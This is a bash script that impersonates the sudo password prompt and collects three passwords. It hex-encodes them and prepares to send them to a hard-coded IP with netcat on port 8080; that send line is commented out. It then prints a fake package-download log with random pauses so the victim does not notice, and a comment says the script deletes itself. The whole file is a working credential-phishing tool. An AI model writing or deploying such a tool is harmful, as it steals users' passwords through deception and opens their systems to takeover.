#!/bin/bash

list=()
int=1

while [ $int -le 3 ]
do

    read -sp "[sudo] password for $USER: " pwd < /dev/tty
    echo ""

    if [ ${#pwd} -ge 4 ]; then
        ((int++))
    fi

    sleep $(awk 'BEGIN{srand(); print 0.4 + rand() * 1}')

    if [ $int -le 3 ]; then
        echo "Sorry, try again."
    fi

    list+=("$pwd")
done

# encore pwd into something
s=""
for entry in "${list[@]}"
do
    hex_value=$(echo -n "$entry" | xxd -p)

    s+="${hex_value}|"
done

# sending S to PC

# Sending
echo "starting to send info ####"
receiver_ip="172.17.189.49" # <--- IMPORTANT: Change this to your PC's IP!

# Send the string
# echo "$s" | nc $receiver_ip 8080
#


# fake alot of stuff

read -r -d '' brew_output <<EOF
Downloading testingSuiteFXD
=> Resolving host: get.pkg.dev-internal.io... 192.168.1.101
=> Connecting to get.pkg.dev-internal.io|192.168.1.101|:443... connected.
=> HTTP request sent, awaiting response... 200 OK
Length: 284591239 (271M) [application/x-compressed-tar]
Saving to: ‘testingSuiteFXD.tar.gz’

[INFO] Beginning file transfer...
[DEBUG] Setting chunk size to 4096 bytes.
[INFO] Disk space check: 54.2GB available. Proceeding.
testingSuiteFXD.tar.gz   [=====>                             ]  15%  41.2M  18.4MB/s   eta 12s
[WARN] Network jitter detected. Retrying packet 8491...
[WARN] Packet 8491 re-sent successfully.
testingSuiteFXD.tar.gz   [================>                  ]  51%   139M  17.9MB/s   eta 6s
[DEBUG] Flushing memory buffer to disk.
[DEBUG] Syncing file descriptor 7.
testingSuiteFXD.tar.gz   [=============================>     ]  89%   242M  19.1MB/s   eta 1s
[DEBUG] Received final packet. Assembling file.
testingSuiteFXD.tar.gz   [==================================>] 100%   271M  18.8MB/s   in 14.4s

2025-07-26 23:27:12 (18.8 MB/s) - ‘testingSuiteFXD.tar.gz’ saved [284591239/284591239]

[INFO] Download complete. Verifying file integrity...
=> Running SHA256 checksum on downloaded file.
=> Expected: 4e9b8b8b0e8c9b3c4f0f0f3e6a7c8b9b9c0c1d2e3f4g5h6i7j8k9l0m
=>   Actual: 4e9b8b8b0e8c9b3c4f0f0f3e6a7c8b9b9c0c1d2e3f4g5h6i7j8k9l0m
[INFO] Checksum PASSED.
[INFO] Cleaning up temporary artifacts...
[DEBUG] Removing '.part' file.
Successfully downloaded testingSuiteFXD
EOF

# Read the multi-line string line by line
while IFS= read -r line; do
  # Print the current line
  echo "$line"
  
  # Pause for a very short, random duration to make it look realistic
  sleep $(awk 'BEGIN{srand(); print 0.1 + rand() * 0.3}')
done <<< "$brew_output"

# deletes itself (in the downlaod script)